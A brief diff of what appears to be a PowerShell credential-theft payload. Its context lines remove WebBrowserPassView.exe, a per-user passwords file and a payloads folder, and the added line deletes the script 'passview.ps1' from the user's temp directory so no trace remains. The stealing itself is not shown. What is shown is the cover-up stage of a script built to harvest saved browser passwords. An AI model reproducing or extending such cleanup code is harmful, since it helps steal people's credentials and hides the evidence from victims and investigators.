@@ -46,4 +46,5 @@ Remove-Item WebBrowserPassView.exe
 Remove-Item passwords-$env:UserName$random.txt
 cd..
 Remove-Item payloads
+Remove-Item C:\Users\$env:UserName\appdata\local\temp\passview.ps1
 exit
